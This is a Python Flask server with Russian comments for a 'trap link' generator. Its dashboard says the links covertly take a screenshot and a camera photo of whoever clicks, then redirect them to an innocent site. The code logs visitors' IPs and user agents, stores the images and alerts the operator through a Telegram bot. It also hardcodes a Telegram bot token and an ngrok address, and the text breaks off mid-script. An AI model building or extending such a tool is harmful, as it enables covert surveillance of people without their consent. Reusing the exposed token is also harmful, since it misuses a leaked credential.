#!/usr/bin/env python3
"""
Сервер для приема скриншотов и фото с камеры с генератором ссылок и авторизацией Telegram
"""

from flask import Flask, request, jsonify, render_template_string, send_from_directory, session, redirect, url_for, make_response
from flask_session import Session
import os
import json
import datetime
import requests
from threading import Thread, Lock
import logging
import telebot
from telebot import types
import time
import secrets
import subprocess
import re
import sqlite3
from functools import wraps
import uuid
import qrcode
from io import BytesIO
import base64
import hashlib

# Настройки
TELEGRAM_BOT_TOKEN = "8170673597:AAFmgSteBsseY6fnMJE1Iiha3VWDDngb3UQ"  # Токен бота
SECRET_KEY = "supersecretkey" + str(uuid.uuid4())  # Уникальный ключ
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# База данных
DB_FILE = "users.db"

# Инициализация Flask
app = Flask(__name__)
app.secret_key = SECRET_KEY
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_PERMANENT'] = True  # Постоянные сессии
app.config['SESSION_USE_SIGNER'] = True
app.config['SESSION_FILE_DIR'] = './flask_session/'
app.config['PERMANENT_SESSION_LIFETIME'] = 86400 * 30  # 30 дней
app.config['SESSION_COOKIE_NAME'] = 'screenshot_tracker_session'
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['SESSION_COOKIE_SECURE'] = False  # True для HTTPS
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'

Session(app)

# Инициализация Telegram бота
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Глобальные переменные
NGROK_URL = "https://kimberly-refractometric-nonorthographically.ngrok-free.dev"  # Ваш фиксированный ngrok URL
LOCAL_URL = "http://localhost:8080"
db_lock = Lock()

# ========== БАЗА ДАННЫХ ==========

def init_db():
    """Инициализация базы данных"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        # Таблица пользователей
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY AUTOINCREMENT,
                chat_id INTEGER UNIQUE,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_login TIMESTAMP,
                auth_token TEXT UNIQUE,
                auth_token_expires TIMESTAMP
            )
        ''')
        
        # Таблица постоянных сессий
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS persistent_sessions (
                session_id TEXT PRIMARY KEY,
                user_id INTEGER,
                user_agent_hash TEXT,
                ip_address TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_used TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP DEFAULT (datetime(CURRENT_TIMESTAMP, '+90 days')),
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        # Таблица ссылок
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS links (
                link_id TEXT PRIMARY KEY,
                user_id INTEGER,
                name TEXT,
                redirect_url TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP DEFAULT (datetime(CURRENT_TIMESTAMP, '+24 hours')),
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1,
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        # Таблица кликов
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS clicks (
                click_id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                ip TEXT,
                user_agent TEXT,
                referer TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (link_id) REFERENCES links (link_id)
            )
        ''')
        
        # Таблица сессий для входа
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS login_sessions (
                session_id TEXT PRIMARY KEY,
                user_id INTEGER,
                telegram_data TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                expires_at TIMESTAMP DEFAULT (datetime(CURRENT_TIMESTAMP, '+1 hour')),
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        # Таблица изображений
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS images (
                image_id INTEGER PRIMARY KEY AUTOINCREMENT,
                link_id TEXT,
                image_type TEXT,
                session_id TEXT,
                filename TEXT,
                uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (link_id) REFERENCES links (link_id)
            )
        ''')
        
        conn.commit()
        conn.close()
        print("✅ База данных инициализирована")

def get_user_by_chat_id(chat_id):
    """Получить пользователя по chat_id"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE chat_id = ?', (chat_id,))
        user = cursor.fetchone()
        conn.close()
        return dict(user) if user else None

def get_user_by_id(user_id):
    """Получить пользователя по user_id"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        user = cursor.fetchone()
        conn.close()
        return dict(user) if user else None

def create_or_update_user(chat_id, username, first_name, last_name):
    """Создать или обновить пользователя"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        # Проверяем существующего пользователя
        cursor.execute('SELECT user_id FROM users WHERE chat_id = ?', (chat_id,))
        existing = cursor.fetchone()
        
        if existing:
            # Обновляем существующего
            cursor.execute('''
                UPDATE users 
                SET username = ?, first_name = ?, last_name = ?, last_login = CURRENT_TIMESTAMP
                WHERE chat_id = ?
            ''', (username, first_name, last_name, chat_id))
            user_id = existing[0]
        else:
            # Создаем нового
            cursor.execute('''
                INSERT INTO users (chat_id, username, first_name, last_name, last_login)
                VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)
            ''', (chat_id, username, first_name, last_name))
            user_id = cursor.lastrowid
        
        conn.commit()
        conn.close()
        return user_id

def generate_auth_token(user_id):
    """Генерация токена авторизации"""
    token = secrets.token_urlsafe(32)
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        expires = datetime.datetime.now() + datetime.timedelta(days=90)
        cursor.execute('''
            UPDATE users 
            SET auth_token = ?, auth_token_expires = ?
            WHERE user_id = ?
        ''', (token, expires.isoformat(), user_id))
        
        conn.commit()
        conn.close()
    return token

def get_user_by_token(token):
    """Получить пользователя по токену"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('''
            SELECT * FROM users 
            WHERE auth_token = ? AND auth_token_expires > CURRENT_TIMESTAMP
        ''', (token,))
        user = cursor.fetchone()
        conn.close()
        return dict(user) if user else None

def create_persistent_session(user_id, user_agent, ip_address):
    """Создать постоянную сессию"""
    session_id = secrets.token_urlsafe(32)
    user_agent_hash = hashlib.sha256(user_agent.encode()).hexdigest()[:32]
    
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO persistent_sessions (session_id, user_id, user_agent_hash, ip_address)
            VALUES (?, ?, ?, ?)
        ''', (session_id, user_id, user_agent_hash, ip_address))
        
        conn.commit()
        conn.close()
    
    return session_id

def get_persistent_session(session_id):
    """Получить постоянную сессию"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('''
            SELECT ps.*, u.* 
            FROM persistent_sessions ps
            JOIN users u ON ps.user_id = u.user_id
            WHERE ps.session_id = ? AND ps.expires_at > CURRENT_TIMESTAMP
        ''', (session_id,))
        result = cursor.fetchone()
        conn.close()
        
        if result:
            # Обновляем время последнего использования
            conn = sqlite3.connect(DB_FILE)
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE persistent_sessions 
                SET last_used = CURRENT_TIMESTAMP
                WHERE session_id = ?
            ''', (session_id,))
            conn.commit()
            conn.close()
            
            return dict(result)
        return None

def delete_persistent_session(session_id):
    """Удалить постоянную сессию"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM persistent_sessions WHERE session_id = ?', (session_id,))
        conn.commit()
        conn.close()

def create_link(user_id, link_id, name, redirect_url):
    """Создать ссылку"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO links (link_id, user_id, name, redirect_url)
            VALUES (?, ?, ?, ?)
        ''', (link_id, user_id, name, redirect_url))
        
        conn.commit()
        conn.close()

def get_user_links(user_id):
    """Получить все ссылки пользователя"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM links WHERE user_id = ? ORDER BY created_at DESC', (user_id,))
        links = cursor.fetchall()
        conn.close()
        return [dict(link) for link in links]

def get_link(link_id):
    """Получить ссылку по ID"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM links WHERE link_id = ?', (link_id,))
        link = cursor.fetchone()
        conn.close()
        return dict(link) if link else None

def increment_clicks(link_id, ip, user_agent, referer):
    """Увеличить счетчик кликов и записать информацию"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        # Увеличиваем счетчик
        cursor.execute('UPDATE links SET clicks = clicks + 1 WHERE link_id = ?', (link_id,))
        
        # Записываем детали клика
        cursor.execute('''
            INSERT INTO clicks (link_id, ip, user_agent, referer)
            VALUES (?, ?, ?, ?)
        ''', (link_id, ip, user_agent, referer))
        
        conn.commit()
        conn.close()

def delete_link(user_id, link_id):
    """Удалить ссылку"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        # Проверяем владельца
        cursor.execute('SELECT user_id FROM links WHERE link_id = ?', (link_id,))
        link = cursor.fetchone()
        
        if link and link[0] == user_id:
            cursor.execute('DELETE FROM links WHERE link_id = ?', (link_id,))
            cursor.execute('DELETE FROM clicks WHERE link_id = ?', (link_id,))
            cursor.execute('DELETE FROM images WHERE link_id = ?', (link_id,))
            conn.commit()
            success = True
        else:
            success = False
        
        conn.close()
        return success

def create_session(user_id, telegram_data):
    """Создать временную сессию для входа через Telegram"""
    session_id = str(uuid.uuid4())
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO login_sessions (session_id, user_id, telegram_data)
            VALUES (?, ?, ?)
        ''', (session_id, user_id, json.dumps(telegram_data)))
        
        conn.commit()
        conn.close()
    return session_id

def create_login_session(user_id, telegram_data):
    """Создать временную сессию для входа через Telegram"""
    session_id = str(uuid.uuid4())
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO login_sessions (session_id, user_id, telegram_data)
            VALUES (?, ?, ?)
        ''', (session_id, user_id, json.dumps(telegram_data)))
        
        conn.commit()
        conn.close()
    return session_id

def get_login_session(session_id):
    """Получить временную сессию входа"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM login_sessions WHERE session_id = ? AND expires_at > CURRENT_TIMESTAMP', (session_id,))
        sess = cursor.fetchone()
        conn.close()
        return dict(sess) if sess else None

def delete_login_session(session_id):
    """Удалить временную сессию входа"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM login_sessions WHERE session_id = ?', (session_id,))
        conn.commit()
        conn.close()

def save_image_info(link_id, image_type, session_id, filename):
    """Сохранить информацию об изображении"""
    with db_lock:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO images (link_id, image_type, session_id, filename)
            VALUES (?, ?, ?, ?)
        ''', (link_id, image_type, session_id, filename))
        
        conn.commit()
        conn.close()

# ========== ДЕКОРАТОР АВТОРИЗАЦИИ ==========

def login_required(f):
    """Декоратор для проверки авторизации"""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Проверяем Flask сессию
        if 'user_id' in session:
            return f(*args, **kwargs)
        
        # Проверяем постоянную сессию из куки
        persistent_session_id = request.cookies.get('persistent_session')
        if persistent_session_id:
            persistent_session = get_persistent_session(persistent_session_id)
            if persistent_session:
                # Восстанавливаем сессию
                session['user_id'] = persistent_session['user_id']
                session['chat_id'] = persistent_session['chat_id']
                session['username'] = persistent_session['username']
                session['first_name'] = persistent_session['first_name']
                session['last_name'] = persistent_session['last_name']
                session.permanent = True
                return f(*args, **kwargs)
        
        # Проверяем токен авторизации
        auth_token = request.cookies.get('auth_token')
        if auth_token:
            user = get_user_by_token(auth_token)
            if user:
                # Создаем сессию
                session['user_id'] = user['user_id']
                session['chat_id'] = user['chat_id']
                session['username'] = user['username']
                session['first_name'] = user['first_name']
                session['last_name'] = user['last_name']
                session.permanent = True
                
                # Создаем постоянную сессию
                user_agent = request.headers.get('User-Agent', '')
                ip_address = request.remote_addr
                persistent_session_id = create_persistent_session(
                    user['user_id'], user_agent, ip_address
                )
                
                response = make_response(redirect(url_for('index')))
                response.set_cookie(
                    'persistent_session',
                    persistent_session_id,
                    max_age=60*60*24*90,  # 90 дней
                    httponly=True,
                    secure=False,
                    samesite='Lax'
                )
                return response
        
        # Не авторизован
        return redirect(url_for('login_page'))
    
    return decorated_function

# ========== ФУНКЦИИ ДЛЯ QR-КОДОВ ==========

def generate_qr_code_base64(data):
    """Генерация QR-кода и возврат в base64"""
    try:
        qr = qrcode.QRCode(
            version=1,
            error_correction=qrcode.constants.ERROR_CORRECT_L,
            box_size=10,
            border=4,
        )
        qr.add_data(data)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        
        # Конвертируем в base64
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        
        return f"data:image/png;base64,{img_str}"
    except Exception as e:
        print(f"Ошибка генерации QR-кода: {e}")
        return None

# ========== HTML ШАБЛОНЫ ==========

LOGIN_HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход через Telegram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 500px;
            width: 100%;
            text-align: center;
        }
        
        h1 {
            color: #333;
            margin-bottom: 20px;
            font-size: 2em;
        }
        
        .subtitle {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .telegram-btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            background: #0088cc;
            color: white;
            text-decoration: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 18px;
            font-weight: 600;
            transition: transform 0.2s, box-shadow 0.2s;
            margin: 20px 0;
        }
        
        .telegram-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 136, 204, 0.4);
        }
        
        .telegram-btn img {
            width: 24px;
            height: 24px;
            margin-right: 10px;
        }
        
        .info-box {
            background: #f8f9fa;
            border-radius: 10px;
            padding: 20px;
            margin-top: 30px;
            text-align: left;
        }
        
        .info-box h3 {
            color: #333;
            margin-bottom: 10px;
        }
        
        .info-box ul {
            padding-left: 20px;
            color: #666;
        }
        
        .info-box li {
            margin-bottom: 10px;
        }
        
        .qr-container {
            margin: 30px 0;
            padding: 20px;
            background: white;
            border-radius: 10px;
            border: 1px solid #e0e0e0;
        }
        
        .qr-code {
            max-width: 200px;
            margin: 0 auto;
        }
        
        .qr-code img {
            width: 100%;
            height: auto;
        }
        
        .status {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            background: #d4edda;
            color: #155724;
            display: none;
        }
        
        .status.error {
            background: #f8d7da;
            color: #721c24;
        }
        
        .status.info {
            background: #d1ecf1;
            color: #0c5460;
        }
        
        .auto-login {
            margin-top: 20px;
            padding: 15px;
            border-radius: 10px;
            background: #fff3cd;
            color: #856404;
            font-size: 14px;
        }
        
        .auto-login input {
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔐 Вход через Telegram</h1>
        
        <p class="subtitle">
            Для доступа к генератору ссылок-ловушек необходимо авторизоваться через Telegram.
            Это нужно для отправки уведомлений прямо в ваш Telegram аккаунт.
        </p>
        
        <div class="auto-login">
            <input type="checkbox" id="rememberMe" checked>
            <label for="rememberMe">Запомнить меня на этом устройстве</label>
        </div>
        
        <a href="https://t.me/{{ bot_username }}" class="telegram-btn" target="_blank">
            <img src="https://telegram.org/img/t_logo.svg" alt="Telegram">
            Открыть Telegram бота
        </a>
        
        <p style="margin: 20px 0; color: #666;">Или отсканируйте QR-код:</p>
        
        <div class="qr-container">
            <div class="qr-code">
                <img src="{{ qr_code_url }}" alt="QR Code">
            </div>
        </div>
        
        <div class="info-box">
            <h3>📋 Что потребуется:</h3>
            <ul>
                <li>1. Нажмите кнопку выше или отсканируйте QR-код</li>
                <li>2. Откроется Telegram с ботом</li>
                <li>3. Нажмите кнопку "Войти на сайт" в боте</li>
                <li>4. Вернитесь на эту страницу - вход произойдет автоматически</li>
            </ul>
        </div>
        
        <div class="status" id="status"></div>
        
        <div style="margin-top: 30px; color: #888; font-size: 14px;">
            Бот: @{{ bot_username }}<br>
            После входа вы сможете создавать ссылки и получать уведомления<br>
        </div>
    </div>
    
    <script>
        // Проверка авторизации каждые 3 секунды
        function checkAuth() {
            fetch('/api/check-auth')
                .then(response => {
                    if (!response.ok) throw new Error('Network error');
                    return response.json();
                })
                .then(data => {
                    const statusEl = document.getElementById('status');
                    if (data.authenticated) {
                        statusEl.textContent = '✅ Авторизация успешна!';
                        statusEl.className = 'status';
                        statusEl.style.display = 'block';
                        
                        // Сохраняем настройку "запомнить меня"
                        const rememberMe = document.getElementById('rememberMe').checked;
                        localStorage.setItem('remember_me', rememberMe ? 'true' : 'false');
                        
                        setTimeout(() => {
                            window.location.href = '/';
                        }, 1000);
                    } else if (data.waiting) {
                        statusEl.textContent = '⏳ Ожидание авторизации в боте...';
                        statusEl.className = 'status info';
                        statusEl.style.display = 'block';
                    } else {
                        statusEl.style.display = 'none';
                    }
                })
                .catch(error => {
                    console.error('Error:', error);
                    const statusEl = document.getElementById('status');
                    statusEl.textContent = '⚠️ Ошибка соединения. Проверьте интернет.';
                    statusEl.className = 'status error';
                    statusEl.style.display = 'block';
                });
        }
        
        // Восстанавливаем настройку "запомнить меня"
        function restoreRememberMe() {
            const rememberMe = localStorage.getItem('remember_me');
            if (rememberMe !== null) {
                document.getElementById('rememberMe').checked = rememberMe === 'true';
            }
        }
        
        // Запускаем проверку при загрузке и каждые 3 секунды
        document.addEventListener('DOMContentLoaded', () => {
            restoreRememberMe();
            checkAuth();
            setInterval(checkAuth, 3000);
        });
    </script>
</body>
</html>"""

GENERATOR_HTML = """<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Генератор ссылок-ловушек</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        
        .header {
            background: white;
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .user-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .avatar {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 20px;
            font-weight: bold;
        }
        
        .user-details h2 {
            color: #333;
            margin-bottom: 5px;
        }
        
        .user-details p {
            color: #666;
            font-size: 14px;
        }
        
        .logout-btn {
            background: #dc3545;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            transition: background 0.3s;
        }
        
        .logout-btn:hover {
            background: #c82333;
        }
        
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            max-width: 1000px;
            margin: 0 auto;
        }
        
        h1 {
            color: #333;
            margin-bottom: 10px;
            text-align: center;
            font-size: 2.5em;
        }
        
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 40px;
            font-size: 1.1em;
        }
        
        .form-group {
            margin-bottom: 25px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 600;
        }
        
        input[type="text"] {
            width: 100%;
            padding: 15px;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 16px;
            transition: border 0.3s;
        }
        
        input[type="text"]:focus {
            outline: none;
            border-color: #667eea;
        }
        
        .btn {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            display: block;
            width: 100%;
            margin-top: 20px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
        }
        
        .link-result {
            margin-top: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 10px;
            display: none;
        }
        
        .link-result.active {
            display: block;
            animation: fadeIn 0.5s;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .generated-link {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .link-input {
            flex: 1;
            padding: 12px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            background: white;
            font-size: 14px;
            word-break: break-all;
        }
        
        .copy-btn {
            background: #28a745;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
            white-space: nowrap;
        }
        
        .copy-btn:hover {
            background: #218838;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-top: 40px;
        }
        
        .stat-box {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }
        
        .stat-number {
            font-size: 2em;
            font-weight: bold;
            color: #667eea;
            margin-bottom: 5px;
        }
        
        .stat-label {
            color: #666;
            font-size: 0.9em;
        }
        
        .links-list {
            margin-top: 40px;
        }
        
        .link-item {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .link-info {
            flex: 1;
            overflow: hidden;
        }
        
        .link-name {
            font-weight: 600;
            color: #333;
            margin-bottom: 5px;
        }
        
        .link-url {
            color: #666;
            font-size: 0.9em;
            word-break: break-all;
            margin-bottom: 5px;
        }
        
        .link-stats {
            font-size: 0.8em;
            color: #888;
        }
        
        .delete-btn {
            background: #dc3545;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.9em;
            white-space: nowrap;
            margin-left: 10px;
        }
        
        .btn-group {
            display: flex;
            gap: 10px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        
        .btn-secondary {
            background: #6c757d;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            flex: 1;
        }
        
        .btn-secondary:hover {
            background: #5a6268;
        }
        
        .btn-success {
            background: #28a745;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 14px;
            flex: 1;
        }
        
        .btn-success:hover {
            background: #218838;
        }
        
        .qr-container {
            text-align: center;
            margin-top: 20px;
            padding: 20px;
            background: white;
            border-radius: 10px;
            border: 1px solid #e0e0e0;
        }
        
        .qr-code {
            max-width: 200px;
            margin: 0 auto;
        }
        
        .qr-code img {
            width: 100%;
            height: auto;
        }
        
        .loading {
            text-align: center;
            padding: 40px;
            color: #666;
        }
        
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 25px;
            border-radius: 10px;
            background: #28a745;
            color: white;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            z-index: 1000;
            display: none;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from { transform: translateX(100%); opacity: 0; }
            to { transform: translateX(0); opacity: 1; }
        }
        
        .notification.error {
            background: #dc3545;
        }
        
        .notification.info {
            background: #17a2b8;
        }
        
        .session-info {
            font-size: 12px;
            color: #888;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="user-info">
            <div class="avatar" id="userAvatar">{{ user_initials }}</div>
            <div class="user-details">
                <h2 id="userName">{{ user_name }}</h2>
                <p id="userStats">Ссылок: <span id="linkCount">0</span> • Кликов: <span id="clickCount">0</span></p>
                <p class="session-info">✅ Сессия сохранена до {{ session_expiry }}</p>
            </div>
        </div>
        <div>
            <button onclick="logout(false)" class="logout-btn" style="background: #6c757d; margin-right: 10px;">🚪 Выйти</button>
            <button onclick="logout(true)" class="logout-btn">🗑 Выйти везде</button>
        </div>
    </div>
    
    <div class="container">
        <h1>🕵️‍♂️ Генератор ссылок-ловушек</h1>
        <p class="subtitle">Создавайте ссылки, которые делают скриншот и фото с камеры при переходе</p>
        
        <form id="linkForm">
            <div class="form-group">
                <label for="linkName">Название ссылки (необязательно):</label>
                <input type="text" id="linkName" placeholder="Например: 'Проверка безопасности'">
            </div>
            
            <div class="form-group">
                <label for="redirectUrl">URL для перенаправления:</label>
                <input type="text" id="redirectUrl" placeholder="https://www.google.com" value="https://www.google.com">
            </div>
            
            <button type="submit" class="btn">🎯 Сгенерировать ссылку</button>
        </form>
        
        <div id="linkResult" class="link-result">
            <h3>✅ Ссылка создана!</h3>
            
            <div class="generated-link">
                <input type="text" id="generatedLink" readonly class="link-input">
                <button onclick="copyLink()" class="copy-btn">📋 Копировать</button>
            </div>
            
            <div class="generated-link">
                <input type="text" id="shortLink" readonly class="link-input">
                <button onclick="copyShortLink()" class="copy-btn">🔗 Короткая</button>
            </div>
            
            <div class="btn-group">
                <button onclick="testLink()" class="btn-secondary">🧪 Тестировать ссылку</button>
                <button onclick="showQRCode()" class="btn-success">📱 Показать QR-код</button>
                <button onclick="sendToTelegram()" class="btn-secondary">📤 Отправить в Telegram</button>
            </div>
            
            <div id="qrSection" class="qr-container" style="display: none;">
                <h4>📱 QR-код для быстрого доступа</h4>
                <div class="qr-code">
                    <img id="qrCodeImage" src="" alt="QR Code">
                </div>
                <p style="margin-top: 10px; font-size: 12px; color: #666;">Отсканируйте QR-код камерой телефона для перехода по ссылке</p>
            </div>
        </div>
        
        <div class="stats">
            <div class="stat-box">
                <div class="stat-number" id="totalLinks">0</div>
                <div class="stat-label">Всего ссылок</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="totalClicks">0</div>
                <div class="stat-label">Всего переходов</div>
            </div>
            <div class="stat-box">
                <div class="stat-number" id="activeLinks">0</div>
                <div class="stat-label">Активных ссылок</div>
            </div>
        </div>
        
        <div class="links-list" id="linksList">
            <h3>📋 Ваши ссылки:</h3>
            <div class="loading" id="loadingLinks">Загрузка ссылок...</div>
        </div>
    </div>
    
    <div class="notification" id="notification"></div>
    
    <script>
        // Базовый URL
        const BASE_URL = '{{ base_url }}';
        let userData = {{ user_data|tojson }};
        
        // Обновление статистики пользователя
        function updateUserStats() {
            document.getElementById('linkCount').textContent = document.getElementById('totalLinks').textContent;
            document.getElementById('clickCount').textContent = document.getElementById('totalClicks').textContent;
        }
        
        // Показать уведомление
        function showNotification(message, type = 'success') {
            const notification = document.getElementById('notification');
            notification.textContent = message;
            notification.className = 'notification ' + type;
            notification.style.display = 'block';
            
            setTimeout(() => {
                notification.style.display = 'none';
            }, 3000);
        }
        
        // Загрузка статистики
        async function loadStats() {
            try {
                const response = await fetch('/api/stats');
                if (!response.ok) throw new Error('Network error');
                const data = await response.json();
                
                document.getElementById('totalLinks').textContent = data.total_links || 0;
                document.getElementById('totalClicks').textContent = data.total_clicks || 0;
                document.getElementById('activeLinks').textContent = data.active_links || 0;
                
                updateUserStats();
                loadLinks();
            } catch (error) {
                console.error('Ошибка загрузки статистики:', error);
                showNotification('Ошибка загрузки статистики', 'error');
            }
        }
        
        // Загрузка списка ссылок
        async function loadLinks() {
            try {
                document.getElementById('loadingLinks').style.display = 'block';
                
                const response = await fetch('/api/links');
                if (!response.ok) throw new Error('Network error');
                const links = await response.json();
                
                const linksList = document.getElementById('linksList');
                let html = '<h3>📋 Ваши ссылки:</h3>';
                
                if (!links || links.length === 0) {
                    html += '<p style="text-align: center; color: #666; padding: 20px;">Нет созданных ссылок</p>';
                } else {
                    for (const link of links) {
                        const created = new Date(link.created_at).toLocaleDateString('ru-RU');
                        const expires = new Date(link.expires_at).toLocaleDateString('ru-RU');
                        const status = link.active ? '🟢 Активна' : '🔴 Истекла';
